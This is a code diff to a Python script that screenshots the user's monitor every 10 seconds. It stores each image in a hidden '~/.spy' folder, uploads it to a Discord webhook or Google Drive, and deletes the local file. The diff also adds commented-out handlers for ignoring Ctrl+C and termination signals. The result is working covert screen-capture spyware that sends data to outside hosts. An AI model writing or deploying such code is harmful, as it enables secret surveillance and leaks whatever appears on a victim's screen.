@@ -2,10 +2,14 @@
 
 import time, os
 from datetime import datetime
-
+import signal
 from mss import mss
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from dotenv import load_dotenv
+import signal
+import time
+import sys
+
 
 # required if you want to upload screenshots on google drive
 from google.oauth2.service_account import Credentials
@@ -75,21 +79,40 @@ def upload_file_on_google_drive(file_path, folder_id):
         'name' : file_name
     }
 
+
+# Define a signal handler function that does nothing
+def signal_handler(signum, frame):
+    print(f"Received signal {signum}, but ignoring it.")
+
 if __name__ == "__main__":
     # The simplest use, save a screen shot of the 1st monitor
+    # Ignore SIGINT (Ctrl+C), SIGTERM, and SIGQUIT
+    #signal.signal(signal.SIGINT, signal_handler)  # Handle SIGINT (Ctrl+C)
+    #signal.signal(signal.SIGTERM, signal_handler) # Handle SIGTERM (termination)
+    #signal.signal(signal.SIGQUIT, signal_handler) # Handle SIGQUIT (quit signal)
+
+    # You can add more signals if needed, for example:
+    #signal.signal(signal.SIGHUP, signal_handler)  # Handle SIGHUP (hangup)
+
     while True:
         try:
             print(datetime.now(), 'Taking screenshot...')
             with mss() as sct:
-                filename=sct.shot(output=f"{userhome}/{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.environ.get('USER')}.png")
+                folder = f"{userhome}/.spy"
+                filename= f"{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.environ.get('USER')}.png"
+                path = os.path.join(folder, filename)
+                os.makedirs(folder, exist_ok=True)
+                filename=sct.shot(output=path)
                 try:
-                    print('Uploading file on google drive...', filename)
-                    upload_file_on_google_drive(filename, folder_id);os.unlink(filename)
+                    print('uploading to discord')
+                    upload_file_on_discord(filename);os.unlink(filename)
                 except Exception as e:
                     print(e)
-                    upload_file_on_discord(filename);os.unlink(filename)
+                    print('Uploading file on google drive...', filename)
+                    upload_file_on_google_drive(filename, folder_id);os.unlink(filename)                    
+
         except Exception as e:
             print(e)
         print('sleeping...')
-        time.sleep(15)
+        time.sleep(10)
 
